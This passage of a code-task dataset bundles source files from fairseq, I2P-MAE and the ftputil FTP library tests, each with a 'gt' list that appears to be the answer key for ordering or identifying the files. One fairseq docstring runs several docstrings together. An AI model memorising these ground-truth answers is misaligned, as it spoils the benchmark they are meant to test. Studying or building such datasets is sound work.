\"--share-*-embeddings requires a joined dictionary: \"\n                \"--share-encoder-embeddings requires a joined source \"\n                \"dictionary, --share-decoder-embeddings requires a joined \"\n                \"target dictionary, and --share-all-embeddings requires a \"\n                \"joint source + target dictionary.\"\n            )\n        return build_embedding(shared_dict, embed_dim, pretrained_embed_path)\n\n    def forward(self, src_tokens, src_lengths, prev_output_tokens, **kwargs):\n        raise NotImplementedError\n\n    def max_positions(self):\n\n        return {\n            key: (\n                self.models[key].encoder.max_positions(),\n                self.models[key].decoder.max_positions(),\n            )\n            for key in self.keys\n        }\n\n    def max_decoder_positions(self):\n\n        return min(model.decoder.max_positions() for model in self.models.values())\n\n    @property\n    def encoder(self):\n        return self.models[self.keys[0]].encoder\n\n    @property\n    def decoder(self):\n        return self.models[self.keys[0]].decoder\n\n    def forward_decoder(self, prev_output_tokens, **kwargs):\n        return self.decoder(prev_output_tokens, **kwargs)\n\n    def load_state_dict(self, state_dict, strict=True, args=None):\n        \"\"\"Copies parameters and buffers from *state_dict* into this module and\n        its descendants.\n\n        Overrides the method in :class:`nn.Module`. Compared with that method\n        this additionally \"upgrades\" *state_dicts* from old checkpoints.\n        Base class for decoder-only models.\n\n    Args:\n        decoder (FairseqDecoder): the decoder\n\n        Run the forward pass for a decoder-only model.\n\n        Feeds a batch of tokens through the decoder to predict the next tokens.\n\n        Args:\n            src_tokens (LongTensor): tokens on which to condition the decoder,\n                of shape `(batch, tgt_len)`\n            src_lengths (LongTensor): source sentence lengths of shape `(batch)`\n\n        Returns:\n            tuple:\n                - the decoder's output of shape `(batch, seq_len, vocab)`\n                - a dictionary with any model-specific outputs\n\n        Similar to *forward* but only return features.\n\n        Returns:\n            tuple:\n                - the decoder's features of shape `(batch, seq_len, embed_dim)`\n                - a dictionary with any model-specific outputs\n        Project features to the default output size (typically vocabulary size).Maximum length supported by the model.Maximum length supported by the decoder.\"\"\"\n        return self.decoder.max_positions()\n\n    @property\n    def supported_targets(self):\n        return {\"future\"}\n\n\nclass FairseqEncoderModel(BaseFairseqModel):\n\n\n    def __init__(self, encoder):\n        super().__init__()\n        self.encoder = encoder\n        assert isinstance(self.encoder, FairseqEncoder)\n\n    def forward(self, src_tokens, src_lengths, **kwargs):\n\n        return self.encoder(src_tokens, src_lengths, **kwargs)\n\n    def get_normalized_probs(self, net_output, log_probs, sample=None):\n\n        encoder_out = net_output[\"encoder_out\"]\n        if torch.is_tensor(encoder_out):\n            logits = encoder_out.float()\n            if log_probs:\n                return F.log_softmax(logits, dim=-1)\n            else:\n                return F.softmax(logits, dim=-1)\n        raise NotImplementedError\n\n    def max_positions(self):\n\n        return self.encoder.max_positions()\n\n'emnlp2021-sixt/fairseq/models/composite_encoder.py'\n:\n\n\n\n\nfrom fairseq.models import FairseqEncoder\n\n\nclass CompositeEncoder(FairseqEncoder):\n\n\n    def __init__(self, encoders):\n        super().__init__(next(iter(encoders.values())).dictionary)\n        self.encoders = encoders\n        for key in self.encoders:\n            self.add_module(key, self.encoders[key])\n\n    def forward(self, src_tokens, src_lengths):\n\n        encoder_out = {}\n        for key in self.encoders:\n            encoder_out[key] = self.encoders[key](src_tokens, src_lengths)\n        return encoder_out\n\n    def reorder_encoder_out(self, encoder_out, new_order):\n\n        for key in self.encoders:\n            encoder_out[key] = self.encoders[key].reorder_encoder_out(encoder_out[key], new_order)\n        return encoder_out\n\n    def max_positions(self):\n        return min(self.encoders[key].max_positions() for key in self.encoders)\n\n    def upgrade_state_dict(self, state_dict):\n        for key in self.encoders:\n            self.encoders[key].upgrade_state_dict(state_dict)\n        return state_dict\n\n'emnlp2021-sixt/fairseq/models/__init__.py'\n:\n\n\n\n\nimport argparse\nimport importlib\nimport os\n\nfrom .fairseq_decoder import FairseqDecoder\nfrom .fairseq_encoder import FairseqEncoder\nfrom .fairseq_incremental_decoder import FairseqIncrementalDecoder\nfrom .fairseq_model import (\n    BaseFairseqModel,\n    FairseqEncoderModel,\n    FairseqEncoderDecoderModel,\n    FairseqLanguageModel,\n    FairseqModel,\n    FairseqMultiModel,\n)\n\nfrom .composite_encoder import CompositeEncoder\nfrom .distributed_fairseq_model import DistributedFairseqModel\n\n\nMODEL_REGISTRY = {}\nARCH_MODEL_REGISTRY = {}\nARCH_MODEL_INV_REGISTRY = {}\nARCH_CONFIG_REGISTRY = {}\n\n\n__all__ = [\n    'BaseFairseqModel',\n    'CompositeEncoder',\n    'DistributedFairseqModel',\n    'FairseqDecoder',\n    'FairseqEncoder',\n    'FairseqEncoderDecoderModel',\n    'FairseqEncoderModel',\n    'FairseqIncrementalDecoder',\n    'FairseqLanguageModel',\n    'FairseqModel',\n    'FairseqMultiModel',\n]\n\n\ndef build_model(args, task):\n    return ARCH_MODEL_REGISTRY[args.arch].build_model(args, task)\n\n\ndef register_model(name):\n\n\n    def register_model_cls(cls):\n        if name in MODEL_REGISTRY:\n            raise ValueError('Cannot register duplicate model ({})'.format(name))\n        if not issubclass(cls, BaseFairseqModel):\n            raise ValueError('Model ({}: {}) must extend BaseFairseqModel'.format(name, cls.__name__))\n        MODEL_REGISTRY[name] = cls\n        return cls\n\n    return register_model_cls\n\n\ndef register_model_architecture(model_name, arch_name):\n\n\n    def register_model_arch_fn(fn):\n        if model_name not in MODEL_REGISTRY:\n            raise ValueError('Cannot register model architecture for unknown model type ({})'.format(model_name))\n        if arch_name in ARCH_MODEL_REGISTRY:\n            raise ValueError('Cannot register duplicate model architecture ({})'.format(arch_name))\n        if not callable(fn):\n            raise ValueError('Model architecture must be callable ({})'.format(arch_name))\n        ARCH_MODEL_REGISTRY[arch_name] = MODEL_REGISTRY[model_name]\n        ARCH_MODEL_INV_REGISTRY.setdefault(model_name, []).append(arch_name)\n        ARCH_CONFIG_REGISTRY[arch_name] = fn\n        return fn\n\n    return register_model_arch_fn\n\n\n\nmodels_dir = os.path.dirname(__file__)\nfor file in os.listdir(models_dir):\n    path = os.path.join(models_dir, file)\n    if (\n        not file.startswith('_')\n        and not file.startswith('.')\n        and (file.endswith('.py') or os.path.isdir(path))\n    ):\n        model_name = file[:file.find('.py')] if file.endswith('.py') else file\n        module = importlib.import_module('fairseq.models.' + model_name)\n\n\n        if model_name in MODEL_REGISTRY:\n            parser = argparse.ArgumentParser(add_help=False)\n            group_archs = parser.add_argument_group('Named architectures')\n            group_archs.add_argument('--arch', choices=ARCH_MODEL_INV_REGISTRY[model_name])\n            group_args = parser.add_argument_group('Additional command-line arguments')\n            MODEL_REGISTRY[model_name].add_args(group_args)\n            globals()[model_name + '_parser'] = parser\n",
        "gt": [
            "'emnlp2021-sixt/fairseq/models/composite_encoder.py'",
            "'emnlp2021-sixt/fairseq/models/__init__.py'",
            "'emnlp2021-sixt/fairseq/models/fairseq_model.py'"
        ]
    },
    {
        "files": [
            "'I2P-MAE/tools/runner_finetune.py'",
            "'I2P-MAE/main.py'",
            "'I2P-MAE/utils/AverageMeter.py'",
            "'I2P-MAE/tools/__init__.py'"
        ],
        "content": "'I2P-MAE/tools/runner_finetune.py'\n:import torch\nimport torch.nn as nn\nfrom tools import builder\nfrom utils import misc, dist_utils\nimport time\nfrom utils.logger import *\nfrom utils.AverageMeter import AverageMeter\n\nimport numpy as np\nfrom datasets import data_transforms\nfrom pointnet2_ops import pointnet2_utils\nfrom torchvision import transforms\n\n\ntrain_transforms_scan = transforms.Compose(\n    [\n        data_transforms.PointcloudScaleAndTranslate(scale_low=0.9, scale_high=1.1, translate_range=0),\n        data_transforms.PointcloudRotate(),\n    ]\n)\n\ntrain_transforms_modelnet40 = transforms.Compose(\n    [\n        data_transforms.PointcloudScaleAndTranslate(),\n    ]\n)\n\ntest_transforms = transforms.Compose(\n    [\n        data_transforms.PointcloudScaleAndTranslate(),\n    ]\n)\n\n\nclass Acc_Metric:\n    def __init__(self, acc = 0.):\n        if type(acc).__name__ == 'dict':\n            self.acc = acc['acc']\n        elif type(acc).__name__ == 'Acc_Metric':\n            self.acc = acc.acc\n        else:\n            self.acc = acc\n\n    def better_than(self, other):\n        if self.acc > other.acc:\n            return True\n        else:\n            return False\n\n    def state_dict(self):\n        _dict = dict()\n        _dict['acc'] = self.acc\n        return _dict\n\n\ndef run_net(args, config, train_writer=None, val_writer=None):\n    logger = get_logger(args.log_name)\n\n    (train_sampler, train_dataloader), (_, test_dataloader),= builder.dataset_builder(args, config.dataset.train), \\\n                                                            builder.dataset_builder(args, config.dataset.val)\n\n    base_model = builder.model_builder(config.model)\n\n    start_epoch = 0\n    best_metrics = Acc_Metric(0.)\n    best_metrics_vote = Acc_Metric(0.)\n    metrics = Acc_Metric(0.)\n\n\n    if args.resume:\n        start_epoch, best_metric = builder.resume_model(base_model, args, logger = logger)\n        best_metrics = Acc_Metric(best_metrics)\n    else:\n        if args.ckpts is not None:\n            base_model.load_model_from_ckpt(args.ckpts)\n        else:\n            print_log('Training from scratch', logger = logger)\n\n    if args.use_gpu:\n        base_model.to(args.local_rank)\n\n    if args.distributed:\n\n        if args.sync_bn:\n            base_model = torch.nn.SyncBatchNorm.convert_sync_batchnorm(base_model)\n            print_log('Using Synchronized BatchNorm ...', logger = logger)\n        base_model = nn.parallel.DistributedDataParallel(base_model, device_ids=[args.local_rank % torch.cuda.device_count()])\n        print_log('Using Distributed Data parallel ...' , logger = logger)\n    else:\n        print_log('Using Data parallel ...' , logger = logger)\n        base_model = nn.DataParallel(base_model).cuda()\n\n    optimizer, scheduler = builder.build_opti_sche(base_model, config)\n\n    if args.resume:\n        builder.resume_optimizer(optimizer, args, logger = logger)\n\n\n\n    base_model.zero_grad()\n\n    for name, param in base_model.named_parameters():\n\n        param.requires_grad_(True)\n\n\n\n\n    for epoch in range(start_epoch, config.max_epoch + 1):\n        if args.distributed:\n            train_sampler.set_epoch(epoch)\n        base_model.train()\n\n        epoch_start_time = time.time()\n        batch_start_time = time.time()\n        batch_time = AverageMeter()\n        data_time = AverageMeter()\n        losses = AverageMeter(['loss', 'acc'])\n        num_iter = 0\n        base_model.train()\n        n_batches = len(train_dataloader)\n\n        npoints = config.npoints\n        for idx, (taxonomy_ids, model_ids, data) in enumerate(train_dataloader):\n            num_iter += 1\n            n_itr = epoch * n_batches + idx\n\n            data_time.update(time.time() - batch_start_time)\n\n            points = data[0].cuda()\n            label = data[1].cuda()\n\n            if npoints == 1024:\n                point_all = 1200\n            elif npoints == 2048:\n                point_all = 2400\n            elif npoints == 4096:\n                point_all = 4800\n            elif npoints == 8192:\n                point_all = 8192\n            else:\n                raise NotImplementedError()\n\n            if points.size(1) < point_all:\n                point_all = points.size(1)\n            fps_idx = pointnet2_utils.furthest_point_sample(points, point_all)\n            fps_idx = fps_idx[:, np.random.choice(point_all, npoints, False)]\n            points = pointnet2_utils.gather_operation(points.transpose(1, 2).contiguous(), fps_idx).transpose(1, 2).contiguous()\n\n\n            if config.model['NAME'].split('_')[-1] == 'ScanObjectNN':\n                points = train_transforms_scan(points)\n            elif config.model['NAME'].split('_')[-1] == 'ModelNet40':\n                points = train_transforms_modelnet40(points)\n\n\n            ret = base_model(points)\n            loss, acc = base_model.module.get_loss_acc(ret, label)\n\n            _loss = loss\n\n            _loss.backward()\n\n\n            if num_iter == config.step_per_update:\n                if config.get('grad_norm_clip') is not None:\n                    torch.nn.utils.clip_grad_norm_(base_model.parameters(), config.grad_norm_clip, norm_type=2)\n                num_iter = 0\n                optimizer.step()\n                base_model.zero_grad()\n\n            if args.distributed:\n                loss = dist_utils.reduce_tensor(loss, args)\n                acc = dist_utils.reduce_tensor(acc, args)\n                losses.update([loss.item(), acc.item()])\n            else:\n                losses.update([loss.item(), acc.item()])\n\n\n            if args.distributed:\n                torch.cuda.synchronize()\n\n\n            if train_writer is not None:\n                train_writer.add_scalar('Loss/Batch/Loss', loss.item(), n_itr)\n                train_writer.add_scalar('Loss/Batch/TrainAcc', acc.item(), n_itr)\n                train_writer.add_scalar('Loss/Batch/LR', optimizer.param_groups[0]['lr'], n_itr)\n\n\n            batch_time.update(time.time() - batch_start_time)\n            batch_start_time = time.time()\n\n        if isinstance(scheduler, list):\n            for item in scheduler:\n                item.step(epoch)\n        else:\n            scheduler.step(epoch)\n        epoch_end_time = time.time()\n\n        if train_writer is not None:\n            train_writer.add_scalar('Loss/Epoch/Loss', losses.avg(0), epoch)\n\n        print_log('[Training] EPOCH: %d EpochTime = %.3f (s) Losses = %s lr = %.6f' %\n            (epoch,  epoch_end_time - epoch_start_time, ['%.4f' % l for l in losses.avg()],optimizer.param_groups[0]['lr']), logger = logger)\n\n        if epoch % args.val_freq == 0 and epoch != 0:\n\n            metrics = validate(base_model, test_dataloader, epoch, val_writer, args, config, logger=logger)\n\n            better = metrics.better_than(best_metrics)\n\n            if better:\n                best_metrics = metrics\n                builder.save_checkpoint(base_model, optimizer, epoch, metrics, best_metrics, 'ckpt-best', args, logger = logger)\n                print_log(\"--------------------------------------------------------------------------------------------\", logger=logger)\n        builder.save_checkpoint(base_model, optimizer, epoch, metrics, best_metrics, 'ckpt-last', args, logger = logger)\n    if train_writer is not None:\n        train_writer.close()\n    if val_writer is not None:\n        val_writer.close()\n\ndef validate(base_model, test_dataloader, epoch, val_writer, args, config, logger = None):\n    print_log(f\"[VALIDATION] Start validating epoch {epoch}\", logger = logger)\n    base_model.eval()\n\n    test_pred  = []\n    test_label = []\n    npoints = config.npoints\n    with torch.no_grad():\n        for idx, (taxonomy_ids, model_ids, data) in enumerate(test_dataloader):\n            points = data[0].cuda()\n            label = data[1].cuda()\n\n            points = misc.fps(points, npoints)\n\n            logits = base_model(points)\n            target = label.view(-1)\n\n            pred = logits.argmax(-1).view(-1)\n\n            test_pred.append(pred.detach())\n            test_label.append(target.detach())\n\n        test_pred = torch.cat(test_pred, dim=0)\n        test_label = torch.cat(test_label, dim=0)\n\n        if args.distributed:\n            test_pred = dist_utils.gather_tensor(test_pred, args)\n            test_label = dist_utils.gather_tensor(test_label, args)\n\n        acc = (test_pred == test_label).sum() / float(test_label.size(0)) * 100.\n        print_log('[Validation] EPOCH: %d  acc = %.4f' % (epoch, acc), logger=logger)\n\n        if args.distributed:\n            torch.cuda.synchronize()\n\n\n    if val_writer is not None:\n        val_writer.add_scalar('Metric/ACC', acc, epoch)\n\n    return Acc_Metric(acc)\n\ndef validate_vote(base_model, test_dataloader, epoch, val_writer, args, config, logger = None, times = 10):\n    print_log(f\"[VALIDATION_VOTE] epoch {epoch}\", logger = logger)\n    base_model.eval()\n\n    test_pred  = []\n    test_label = []\n    npoints = config.npoints\n    with torch.no_grad():\n        for idx, (taxonomy_ids, model_ids, data) in enumerate(test_dataloader):\n            points_raw = data[0].cuda()\n            label = data[1].cuda()\n            if npoints == 1024:\n                point_all = 1200\n            elif npoints == 4096:\n                point_all = 4800\n            elif npoints == 8192:\n                point_all = 8192\n            else:\n                raise NotImplementedError()\n\n            if points_raw.size(1) < point_all:\n                point_all = points_raw.size(1)\n\n            fps_idx_raw = pointnet2_utils.furthest_point_sample(points_raw, point_all)\n            local_pred = []\n\n            for kk in range(times):\n                fps_idx = fps_idx_raw[:, np.random.choice(point_all, npoints, False)]\n                points = pointnet2_utils.gather_operation(points_raw.transpose(1, 2).contiguous(),\n                                                        fps_idx).transpose(1, 2).contiguous()\n\n                points = test_transforms(points)\n\n                logits = base_model(points)\n                target = label.view(-1)\n\n                local_pred.append(logits.detach().unsqueeze(0))\n\n            pred = torch.cat(local_pred, dim=0).mean(0)\n            _, pred_choice = torch.max(pred, -1)\n\n\n            test_pred.append(pred_choice)\n            test_label.append(target.detach())\n\n        test_pred = torch.cat(test_pred, dim=0)\n        test_label = torch.cat(test_label, dim=0)\n\n        if args.distributed:\n            test_pred = dist_utils.gather_tensor(test_pred, args)\n            test_label = dist_utils.gather_tensor(test_label, args)\n\n        acc = (test_pred == test_label).sum() / float(test_label.size(0)) * 100.\n        print_log('[Validation_vote] EPOCH: %d  acc_vote = %.4f' % (epoch, acc), logger=logger)\n\n        if args.distributed:\n            torch.cuda.synchronize()\n\n\n    if val_writer is not None:\n        val_writer.add_scalar('Metric/ACC_vote', acc, epoch)\n\n    return Acc_Metric(acc)\n\n\n\ndef test_net(args, config):\n    logger = get_logger(args.log_name)\n    print_log('Tester start ... ', logger = logger)\n    _, test_dataloader = builder.dataset_builder(args, config.dataset.test)\n    base_model = builder.model_builder(config.model)\n\n\n    base_model.load_model_from_ckpt(args.ckpts)\n    if args.use_gpu:\n        base_model.to(args.local_rank)\n\n\n    if args.distributed:\n        raise NotImplementedError()\n\n    test(base_model, test_dataloader, args, config, logger=logger)\n\ndef test(base_model, test_dataloader, args, config, logger = None):\n    base_model.eval()\n\n    test_pred  = []\n    test_label = []\n    npoints = config.npoints\n\n    with torch.no_grad():\n        for idx, (taxonomy_ids, model_ids, data) in enumerate(test_dataloader):\n            points = data[0].cuda()\n            label = data[1].cuda()\n\n            points = misc.fps(points, npoints)\n\n            logits = base_model(points)\n            target = label.view(-1)\n\n            pred = logits.argmax(-1).view(-1)\n\n            test_pred.append(pred.detach())\n            test_label.append(target.detach())\n\n        test_pred = torch.cat(test_pred, dim=0)\n        test_label = torch.cat(test_label, dim=0)\n\n        if args.distributed:\n            test_pred = dist_utils.gather_tensor(test_pred, args)\n            test_label = dist_utils.gather_tensor(test_label, args)\n\n        acc = (test_pred == test_label).sum() / float(test_label.size(0)) * 100.\n        print_log('[TEST] acc = %.4f' % acc, logger=logger)\n        if args.vote == False:\n            return\n        if args.distributed:\n            torch.cuda.synchronize()\n\n        print_log(f\"[TEST_VOTE]\", logger = logger)\n        acc = 0.\n        for time in range(1, 50):\n            this_acc = test_vote(base_model, test_dataloader, 1, None, args, config, logger=logger, times=10)\n            if acc < this_acc:\n                acc = this_acc\n            print_log('[TEST_VOTE_time %d]  acc = %.4f, best acc = %.4f' % (time, this_acc, acc), logger=logger)\n        print_log('[TEST_VOTE] acc = %.4f' % acc, logger=logger)\n\ndef test_vote(base_model, test_dataloader, epoch, val_writer, args, config, logger = None, times = 10):\n\n    base_model.eval()\n\n    test_pred  = []\n    test_label = []\n    npoints = config.npoints\n    with torch.no_grad():\n        for idx, (taxonomy_ids, model_ids, data) in enumerate(test_dataloader):\n            points_raw = data[0].cuda()\n            label = data[1].cuda()\n            if npoints == 1024:\n                point_all = 1200\n            elif npoints == 4096:\n                point_all = 4800\n            elif npoints == 8192:\n                point_all = 8192\n            else:\n                raise NotImplementedError()\n\n            if points_raw.size(1) < point_all:\n                point_all = points_raw.size(1)\n\n            fps_idx_raw = pointnet2_utils.furthest_point_sample(points_raw, point_all)\n            local_pred = []\n\n            for kk in range(times):\n                fps_idx = fps_idx_raw[:, np.random.choice(point_all, npoints, False)]\n                points = pointnet2_utils.gather_operation(points_raw.transpose(1, 2).contiguous(),\n                                                        fps_idx).transpose(1, 2).contiguous()\n\n                points = test_transforms(points)\n\n                logits = base_model(points)\n                target = label.view(-1)\n\n                local_pred.append(logits.detach().unsqueeze(0))\n\n            pred = torch.cat(local_pred, dim=0).mean(0)\n            _, pred_choice = torch.max(pred, -1)\n\n\n            test_pred.append(pred_choice)\n            test_label.append(target.detach())\n\n        test_pred = torch.cat(test_pred, dim=0)\n        test_label = torch.cat(test_label, dim=0)\n\n        if args.distributed:\n            test_pred = dist_utils.gather_tensor(test_pred, args)\n            test_label = dist_utils.gather_tensor(test_label, args)\n\n        acc = (test_pred == test_label).sum() / float(test_label.size(0)) * 100.\n\n        if args.distributed:\n            torch.cuda.synchronize()\n\n\n    if val_writer is not None:\n        val_writer.add_scalar('Metric/ACC_vote', acc, epoch)\n\n\n    return acc\n\n'I2P-MAE/main.py'\n:from tools import pretrain_run_net as pretrain\nfrom tools import test_svm_run_net_modelnet40 as test_svm_modelnet40\nfrom tools import test_svm_run_net_scan as test_svm_scan\nfrom tools import finetune_run_net as finetune\nfrom tools import test_run_net as test_net\nfrom utils import parser, dist_utils, misc\nfrom utils.logger import *\nfrom utils.config import *\nimport time\nimport os\nimport torch\nfrom tensorboardX import SummaryWriter\n\n\n\ndef main():\n\n    args = parser.get_args()\n\n    args.use_gpu = torch.cuda.is_available()\n    if args.use_gpu:\n        torch.backends.cudnn.benchmark = True\n\n    if args.launcher == 'none':\n        args.distributed = False\n    else:\n        args.distributed = True\n        dist_utils.init_dist(args.launcher)\n\n        _, world_size = dist_utils.get_dist_info()\n        args.world_size = world_size\n\n    timestamp = time.strftime('%Y%m%d_%H%M%S', time.localtime())\n    log_file = os.path.join(args.experiment_path, f'{timestamp}.log')\n    logger = get_root_logger(log_file=log_file, name=args.log_name)\n\n    if not args.test:\n        if args.local_rank == 0:\n            train_writer = SummaryWriter(os.path.join(args.tfboard_path, 'train'))\n            val_writer = SummaryWriter(os.path.join(args.tfboard_path, 'test'))\n        else:\n            train_writer = None\n            val_writer = None\n\n    config = get_config(args, logger = logger)\n\n    if args.distributed:\n        assert config.total_bs % world_size == 0\n        config.dataset.train.others.bs = config.total_bs // world_size\n        if config.dataset.get('extra_train'):\n            config.dataset.extra_train.others.bs = config.total_bs // world_size * 2\n        config.dataset.val.others.bs = config.total_bs // world_size * 2\n        if config.dataset.get('test'):\n            config.dataset.test.others.bs = config.total_bs // world_size\n    else:\n        config.dataset.train.others.bs = config.total_bs\n        if config.dataset.get('extra_train'):\n            config.dataset.extra_train.others.bs = config.total_bs * 2\n        config.dataset.val.others.bs = config.total_bs * 2\n        if config.dataset.get('test'):\n            config.dataset.test.others.bs = config.total_bs\n\n    log_args_to_file(args, 'args', logger = logger)\n    log_config_to_file(config, 'config', logger = logger)\n    logger.info(f'Distributed training: {args.distributed}')\n\n    if args.seed is not None:\n        logger.info(f'Set random seed to {args.seed}, '\n                    f'deterministic: {args.deterministic}')\n        misc.set_random_seed(args.seed + args.local_rank, deterministic=args.deterministic)\n    if args.distributed:\n        assert args.local_rank == torch.distributed.get_rank()\n\n    if args.shot != -1:\n        config.dataset.train.others.shot = args.shot\n        config.dataset.train.others.way = args.way\n        config.dataset.train.others.fold = args.fold\n        config.dataset.val.others.shot = args.shot\n        config.dataset.val.others.way = args.way\n        config.dataset.val.others.fold = args.fold\n\n    if args.test:\n        test_net(args, config)\n        return\n\n    if args.test_svm == 'modelnet40':\n        test_svm_modelnet40(args, config)\n    elif args.test_svm == 'scan':\n        test_svm_scan(args, config)\n    elif args.finetune_model == True:\n        finetune(args, config, train_writer, val_writer)\n    else:\n        pretrain(args, config, train_writer, val_writer)\n\n\nif __name__ == '__main__':\n    main()\n\n'I2P-MAE/utils/AverageMeter.py'\n:\nclass AverageMeter(object):\n    def __init__(self, items=None):\n        self.items = items\n        self.n_items = 1 if items is None else len(items)\n        self.reset()\n\n    def reset(self):\n        self._val = [0] * self.n_items\n        self._sum = [0] * self.n_items\n        self._count = [0] * self.n_items\n\n    def update(self, values):\n        if type(values).__name__ == 'list':\n            for idx, v in enumerate(values):\n                self._val[idx] = v\n                self._sum[idx] += v\n                self._count[idx] += 1\n        else:\n            self._val[0] = values\n            self._sum[0] += values\n            self._count[0] += 1\n\n    def val(self, idx=None):\n        if idx is None:\n            return self._val[0] if self.items is None else [self._val[i] for i in range(self.n_items)]\n        else:\n            return self._val[idx]\n\n    def count(self, idx=None):\n        if idx is None:\n            return self._count[0] if self.items is None else [self._count[i] for i in range(self.n_items)]\n        else:\n            return self._count[idx]\n\n    def avg(self, idx=None):\n        if idx is None:\n            return self._sum[0] / self._count[0] if self.items is None else [\n                self._sum[i] / self._count[i] for i in range(self.n_items)\n            ]\n        else:\n            return self._sum[idx] / self._count[idx]\n'I2P-MAE/tools/__init__.py'\n:from .runner_pretrain import run_net as pretrain_run_net\nfrom .runner_test_svm import run_net_svm_modelnet40 as test_svm_run_net_modelnet40\nfrom .runner_test_svm import run_net_svm_scan as test_svm_run_net_scan\nfrom .runner_finetune import run_net as finetune_run_net\nfrom .runner_finetune import test_net as test_run_net\n",
        "gt": [
            "'I2P-MAE/utils/AverageMeter.py'",
            "'I2P-MAE/tools/runner_finetune.py'",
            "'I2P-MAE/tools/__init__.py'",
            "'I2P-MAE/main.py'"
        ]
    },
    {
        "files": [
            "'Ramen/fs_libs/ftputil/test/test_host.py'",
            "'Ramen/fs_libs/ftputil/test/test_with_statement.py'",
            "'Ramen/fs_libs/ftputil/build/lib/ftputil/__init__.py'"
        ],
        "content": "'Ramen/fs_libs/ftputil/test/test_host.py'\n:\n\n\n\nfrom __future__ import unicode_literals\n\nimport ftplib\nimport itertools\nimport os\nimport posixpath\nimport random\nimport time\nimport unittest\n\nimport ftputil\nimport ftputil.compat\nimport ftputil.error\nimport ftputil.tool\nimport ftputil.stat\n\nfrom test import mock_ftplib\nfrom test import test_base\n\n\n\n\n\ndef random_data(pool, size=10000):\n\n    ordinal_list = [random.choice(pool) for i in range(size)]\n    return ftputil.compat.bytes_from_ints(ordinal_list)\n\n\ndef ascii_data():\n    r\"\"\"\n    Return a unicode string of \"normal\" ASCII characters, including `\\r`.\n    \"\"\"\n    pool = list(range(32, 128))\n\n\n    pool.append(ord(\"\\r\"))\n    return ftputil.tool.as_unicode(random_data(pool))\n\n\ndef binary_data():\n\n    pool = list(range(0, 256))\n    return random_data(pool)\n\n\n\n\n\nclass FailOnLoginSession(mock_ftplib.MockSession):\n\n    def __init__(self, host=\"\", user=\"\", password=\"\"):\n        raise ftplib.error_perm\n\n\nclass FailOnKeepAliveSession(mock_ftplib.MockSession):\n\n    def pwd(self):\n\n        if not hasattr(self, \"pwd_called\"):\n            self.pwd_called = True\n        else:\n            raise ftplib.error_temp\n\n\nclass RecursiveListingForDotAsPathSession(mock_ftplib.MockSession):\n\n    dir_contents = {\n      \".\": \"\"\"\\\nlrwxrwxrwx   1 staff          7 Aug 13  2003 bin -> usr/bin\n\ndev:\ntotal 10\n\netc:\ntotal 10\n\npub:\ntotal 4\n-rw-r--r--   1 staff         74 Sep 25  2000 .message\n----------   1 staff          0 Aug 16  2003 .notar\ndrwxr-xr-x  12 ftp          512 Nov 23  2008 freeware\n\nusr:\ntotal 4\"\"\",\n\n      \"\": \"\"\"\\\ntotal 10\nlrwxrwxrwx   1 staff          7 Aug 13  2003 bin -> usr/bin\nd--x--x--x   2 staff        512 Sep 24  2000 dev\nd--x--x--x   3 staff        512 Sep 25  2000 etc\ndr-xr-xr-x   3 staff        512 Oct  3  2000 pub\nd--x--x--x   5 staff        512 Oct  3  2000 usr\"\"\"}\n\n    def _transform_path(self, path):\n        return path\n\n\nclass BinaryDownloadMockSession(mock_ftplib.MockUnixFormatSession):\n\n    mock_file_content = binary_data()\n\n\nclass TimeShiftMockSession(mock_ftplib.MockSession):\n\n    def delete(self, file_name):\n        pass\n\n\n\n\n\nclass FailingUploadAndDownloadFTPHost(ftputil.FTPHost):\n\n    def upload(self, source, target, mode=\"\"):\n        assert False, \"`FTPHost.upload` should not have been called\"\n\n    def download(self, source, target, mode=\"\"):\n        assert False, \"`FTPHost.download` should not have been called\"\n\n\nclass TimeShiftFTPHost(ftputil.FTPHost):\n\n    class _Path:\n        def split(self, path):\n            return posixpath.split(path)\n        def set_mtime(self, mtime):\n            self._mtime = mtime\n        def getmtime(self, file_name):\n            return self._mtime\n        def join(self, *args):\n            return posixpath.join(*args)\n        def normpath(self, path):\n            return posixpath.normpath(path)\n        def isabs(self, path):\n            return posixpath.isabs(path)\n        def abspath(self, path):\n            return \"/home/sschwarzer/_ftputil_sync_\"\n\n        def isfile(self, path):\n            return True\n\n    def __init__(self, *args, **kwargs):\n        ftputil.FTPHost.__init__(self, *args, **kwargs)\n        self.path = self._Path()\n\n\n\n\nclass TestInitAndClose(unittest.TestCase):\n\n\n    def test_open_and_close(self):\n        host = test_base.ftp_host_factory()\n        host.close()\n        self.assertEqual(host.closed, True)\n        self.assertEqual(host._children, [])\n\n\nclass TestLogin(unittest.TestCase):\n\n    def test_invalid_login(self):\n\n        self.assertRaises(ftputil.error.FTPOSError, test_base.ftp_host_factory,\n                          FailOnLoginSession)\n\n\nclass TestKeepAlive(unittest.TestCase):\n\n    def test_succeeding_keep_alive(self):\n\n        host = test_base.ftp_host_factory()\n        host.keep_alive()\n\n    def test_failing_keep_alive(self):\n\n        host = test_base.ftp_host_factory(\n                 session_factory=FailOnKeepAliveSession)\n        self.assertRaises(ftputil.error.TemporaryError, host.keep_alive)\n\n\nclass TestSetParser(unittest.TestCase):\n\n    class TrivialParser(ftputil.stat.Parser):\n\n\n        def __init__(self):\n\n\n\n            default_stat_result = ftputil.stat.StatResult(os.stat(\"/home\"))\n            default_stat_result._st_name = \"home\"\n            self.default_stat_result = default_stat_result\n\n        def parse_line(self, line, time_shift=0.0):\n            return self.default_stat_result\n\n    def test_set_parser(self):\n\n        host = test_base.ftp_host_factory()\n        self.assertEqual(host._stat._allow_parser_switching, True)\n        trivial_parser = TestSetParser.TrivialParser()\n        host.set_parser(trivial_parser)\n        stat_result = host.stat(\"/home\")\n        self.assertEqual(stat_result, trivial_parser.default_stat_result)\n        self.assertEqual(host._stat._allow_parser_switching, False)\n\n\nclass TestCommandNotImplementedError(unittest.TestCase):\n\n    def test_command_not_implemented_error(self):\n\n        host = test_base.ftp_host_factory()\n        self.assertRaises(ftputil.error.CommandNotImplementedError,\n                          host.chmod, \"nonexistent\", 0o644)\n\n        self.assertRaises(ftputil.error.PermanentError,\n                          host.chmod, \"nonexistent\", 0o644)\n\n\nclass TestRecursiveListingForDotAsPath(unittest.TestCase):\n\n\n    def test_recursive_listing(self):\n        host = test_base.ftp_host_factory(\n                 session_factory=RecursiveListingForDotAsPathSession)\n        lines = host._dir(host.curdir)\n        self.assertEqual(lines[0], \"total 10\")\n        self.assertTrue(lines[1].startswith(\"lrwxrwxrwx   1 staff\"))\n        self.assertTrue(lines[2].startswith(\"d--x--x--x   2 staff\"))\n        host.close()\n\n    def test_plain_listing(self):\n        host = 